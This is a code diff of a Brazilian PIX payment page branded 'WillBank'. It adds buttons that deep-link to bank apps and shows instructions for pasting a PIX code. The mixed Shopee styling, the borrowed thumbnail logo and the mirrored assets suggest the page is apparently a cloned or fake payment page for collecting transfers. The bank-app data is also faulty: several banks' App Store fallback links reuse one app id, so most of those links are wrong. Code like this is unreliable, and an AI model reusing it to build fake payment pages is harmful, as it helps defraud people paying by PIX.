@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pagamento PIX | WillBank</title>
-    <script src="../../3.4.17"></script>
-    <link rel="stylesheet" href="../../css/all.min.css">
-    <link href="../../css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="/3.4.17"></script>
+    <link rel="stylesheet" href="/css/all.min.css">
+    <link href="/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <script>
         tailwind.config = {
@@ -124,7 +124,7 @@
         <!-- Header com Logo -->
         <div class="text-center mb-8">
             <div class="flex items-center justify-center mb-4">
-                <img src="../../images?q=tbn:ANd9GcQtF4d5voZs-uursQomBUaKsPkTw8evy5PwsA&s" alt="WillBank" class="h-12">
+                <img src="/images?q=tbn:ANd9GcQtF4d5voZs-uursQomBUaKsPkTw8evy5PwsA&s" alt="WillBank" class="h-12">
                 <span class="ml-3 text-2xl font-bold text-gray-800">WillBank</span>
             </div>
             <div class="security-badge inline-flex items-center px-4 py-2 rounded-full text-white text-sm font-medium">
@@ -185,6 +185,83 @@
                                 class="bg-shopee text-white px-4 py-3 rounded-r-xl hover:bg-shopee-dark transition-colors">
                             <i class="fas fa-copy"></i>
                         </button>
+                    </div>
+                </div>
+
+                <!-- Botões para Abrir Apps dos Bancos -->
+                <div class="bg-white rounded-xl p-4 mb-6 border border-gray-200">
+                    <h3 class="text-lg font-semibold text-gray-800 mb-3 flex items-center">
+                        <i class="fas fa-mobile-alt mr-2 text-shopee"></i>
+                        Abrir App do Banco
+                    </h3>
+                    
+                    <p class="text-sm text-gray-600 mb-4">
+                        Clique no seu banco para abrir o app automaticamente:
+                    </p>
+                    
+                    <div class="grid grid-cols-2 gap-2">
+                        <!-- Nubank -->
+                        <button type="button" onclick="openBankApp('nubank')" 
+                                class="flex items-center justify-center p-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Nubank</span>
+                        </button>
+                        
+                        <!-- Itaú -->
+                        <button type="button" onclick="openBankApp('itau')" 
+                                class="flex items-center justify-center p-2 bg-orange-600 hover:bg-orange-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Itaú</span>
+                        </button>
+                        
+                        <!-- Bradesco -->
+                        <button type="button" onclick="openBankApp('bradesco')" 
+                                class="flex items-center justify-center p-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Bradesco</span>
+                        </button>
+                        
+                        <!-- Santander -->
+                        <button type="button" onclick="openBankApp('santander')" 
+                                class="flex items-center justify-center p-2 bg-red-700 hover:bg-red-800 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Santander</span>
+                        </button>
+                        
+                        <!-- Banco do Brasil -->
+                        <button type="button" onclick="openBankApp('bb')" 
+                                class="flex items-center justify-center p-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Banco do Brasil</span>
+                        </button>
+                        
+                        <!-- Caixa -->
+                        <button type="button" onclick="openBankApp('caixa')" 
+                                class="flex items-center justify-center p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Caixa</span>
+                        </button>
+                        
+                        <!-- Inter -->
+                        <button type="button" onclick="openBankApp('inter')" 
+                                class="flex items-center justify-center p-2 bg-orange-500 hover:bg-orange-600 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-university mr-1"></i>
+                            <span class="font-medium">Inter</span>
+                        </button>
+                        
+                        <!-- Outros Bancos -->
+                        <button type="button" onclick="openBankApp('outros')" 
+                                class="flex items-center justify-center p-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors text-sm">
+                            <i class="fas fa-ellipsis-h mr-1"></i>
+                            <span class="font-medium">Outros</span>
+                        </button>
+                    </div>
+                    
+                    <div class="mt-3 p-2 bg-blue-50 rounded-lg">
+                        <p class="text-xs text-blue-800">
+                            <i class="fas fa-info-circle mr-1"></i>
+                            <strong>Dica:</strong> Se o app não abrir automaticamente, procure por "PIX" no seu app bancário
+                        </p>
                     </div>
                 </div>
 
@@ -399,7 +476,7 @@
                     checkStatusButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
 
                     // Verificar status via nosso endpoint
-                    const response = await fetch(`../../webhook/check-status.php?id=${currentTransactionId}`, {
+                    const response = await fetch(`/webhook/check-status.php?id=${currentTransactionId}`, {
                         method: 'GET',
                         headers: {
                             'Content-Type': 'application/json'
@@ -434,7 +511,7 @@
                                 
                                 // Redirecionar para sucesso após 2 segundos
                                 setTimeout(() => {
-                                    window.location.href = '../sucesso/';
+                                    window.location.href = '/chat/sucesso/';
                                 }, 2000);
                                 return;
                                 
@@ -547,6 +624,183 @@
             window.addEventListener('beforeunload', function() {
                 if (statusCheckInterval) {
                     clearInterval(statusCheckInterval);
+                }
+            });
+
+            // Função para abrir apps dos bancos
+            window.openBankApp = function(bank) {
+                const bankApps = {
+                    nubank: {
+                        android: 'nubank://app',
+                        ios: 'nubank://app',
+                        fallback: 'https://apps.apple.com/br/app/nubank/id814456780'
+                    },
+                    itau: {
+                        android: 'itau://app',
+                        ios: 'itau://app',
+                        fallback: 'https://apps.apple.com/br/app/itau/id479012155'
+                    },
+                    bradesco: {
+                        android: 'bradesco://app',
+                        ios: 'bradesco://app',
+                        fallback: 'https://apps.apple.com/br/app/bradesco/id477307294'
+                    },
+                    santander: {
+                        android: 'santander://app',
+                        ios: 'santander://app',
+                        fallback: 'https://apps.apple.com/br/app/santander-brasil/id477307294'
+                    },
+                    bb: {
+                        android: 'banco-do-brasil://app',
+                        ios: 'banco-do-brasil://app',
+                        fallback: 'https://apps.apple.com/br/app/banco-do-brasil/id477307294'
+                    },
+                    caixa: {
+                        android: 'caixa://app',
+                        ios: 'caixa://app',
+                        fallback: 'https://apps.apple.com/br/app/caixa-tem/id477307294'
+                    },
+                    inter: {
+                        android: 'inter://app',
+                        ios: 'inter://app',
+                        fallback: 'https://apps.apple.com/br/app/banco-inter/id477307294'
+                    },
+                    outros: {
+                        android: null,
+                        ios: null,
+                        fallback: null
+                    }
+                };
+
+                const selectedBank = bankApps[bank];
+                
+                if (!selectedBank) {
+                    alert('Banco não encontrado. Abra manualmente o app do seu banco.');
+                    return;
+                }
+
+                if (bank === 'outros') {
+                    // Para outros bancos, mostrar instruções
+                    const instructions = `
+                        <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                            <div class="bg-white rounded-xl p-6 max-w-md mx-4">
+                                <h3 class="text-lg font-semibold text-gray-800 mb-4">
+                                    <i class="fas fa-info-circle text-blue-500 mr-2"></i>
+                                    Como abrir seu app bancário
+                                </h3>
+                                <div class="space-y-3 text-sm text-gray-600">
+                                    <p><strong>1.</strong> Abra o app do seu banco</p>
+                                    <p><strong>2.</strong> Procure pela opção "PIX"</p>
+                                    <p><strong>3.</strong> Escolha "Pagar PIX" ou "Colar PIX"</p>
+                                    <p><strong>4.</strong> Cole o código PIX copiado</p>
+                                    <p><strong>5.</strong> Confirme o pagamento</p>
+                                </div>
+                                <button onclick="this.parentElement.parentElement.remove()" 
+                                        class="w-full mt-4 bg-shopee text-white py-2 rounded-lg hover:bg-shopee-dark transition-colors">
+                                    Entendi
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    document.body.insertAdjacentHTML('beforeend', instructions);
+                    return;
+                }
+
+                // Detectar se é mobile
+                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                
+                if (isMobile) {
+                    // Detectar se é iOS
+                    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+                    const appUrl = isIOS ? selectedBank.ios : selectedBank.android;
+                    
+                    if (appUrl) {
+                        // Tentar abrir o app diretamente
+                        window.location.href = appUrl;
+                        
+                        // Se não abrir, mostrar instruções após 3 segundos
+                        setTimeout(() => {
+                            const instructionMessage = `
+                                <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                                    <div class="bg-white rounded-xl p-6 max-w-md mx-4">
+                                        <h3 class="text-lg font-semibold text-gray-800 mb-4">
+                                            <i class="fas fa-mobile-alt text-blue-500 mr-2"></i>
+                                            App não abriu automaticamente?
+                                        </h3>
+                                        <div class="space-y-3 text-sm text-gray-600">
+                                            <p><strong>1.</strong> Abra manualmente o app do seu banco</p>
+                                            <p><strong>2.</strong> Procure pela opção "PIX"</p>
+                                            <p><strong>3.</strong> Escolha "Pagar PIX" ou "Colar PIX"</p>
+                                            <p><strong>4.</strong> Cole o código PIX copiado</p>
+                                        </div>
+                                        <div class="flex space-x-2 mt-4">
+                                            <button onclick="this.parentElement.parentElement.parentElement.remove()" 
+                                                    class="flex-1 bg-gray-300 text-gray-700 py-2 rounded-lg hover:bg-gray-400 transition-colors">
+                                                Fechar
+                                            </button>
+                                            <button onclick="window.location.href='${selectedBank.fallback}'" 
+                                                    class="flex-1 bg-shopee text-white py-2 rounded-lg hover:bg-shopee-dark transition-colors">
+                                                Baixar App
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
+                            document.body.insertAdjacentHTML('beforeend', instructionMessage);
+                        }, 3000);
+                    }
+                } else {
+                    // Em desktop, mostrar QR Code ou instruções
+                    const desktopMessage = `
+                        <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                            <div class="bg-white rounded-xl p-6 max-w-md mx-4">
+                                <h3 class="text-lg font-semibold text-gray-800 mb-4">
+                                    <i class="fas fa-mobile-alt text-blue-500 mr-2"></i>
+                                    Abra no seu celular
+                                </h3>
+                                <p class="text-sm text-gray-600 mb-4">
+                                    Para pagar via PIX, você precisa usar o app do banco no seu celular.
+                                </p>
+                                <div class="space-y-2 text-sm text-gray-600">
+                                    <p><strong>1.</strong> Abra este site no seu celular</p>
+                                    <p><strong>2.</strong> Gere o PIX novamente</p>
+                                    <p><strong>3.</strong> Clique no seu banco para abrir o app</p>
+                                </div>
+                                <button onclick="this.parentElement.parentElement.remove()" 
+                                        class="w-full mt-4 bg-shopee text-white py-2 rounded-lg hover:bg-shopee-dark transition-colors">
+                                    Entendi
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    document.body.insertAdjacentHTML('beforeend', desktopMessage);
+                }
+            };
+
+            // Função para copiar código PIX
+            copyPixButton.addEventListener('click', function() {
+                const pixCodeInput = document.getElementById('pixCode');
+                pixCodeInput.select();
+                pixCodeInput.setSelectionRange(0, 99999); // Para dispositivos móveis
+                
+                try {
+                    document.execCommand('copy');
+                    
+                    // Mostrar feedback visual
+                    const originalText = copyPixButton.innerHTML;
+                    copyPixButton.innerHTML = '<i class="fas fa-check"></i>';
+                    copyPixButton.classList.remove('bg-shopee', 'hover:bg-shopee-dark');
+                    copyPixButton.classList.add('bg-green-600');
+                    
+                    setTimeout(() => {
+                        copyPixButton.innerHTML = originalText;
+                        copyPixButton.classList.remove('bg-green-600');
+                        copyPixButton.classList.add('bg-shopee', 'hover:bg-shopee-dark');
+                    }, 2000);
+                    
+                } catch (err) {
+                    console.error('Erro ao copiar:', err);
+                    alert('Erro ao copiar o código PIX. Copie manualmente.');
                 }
             });
         });
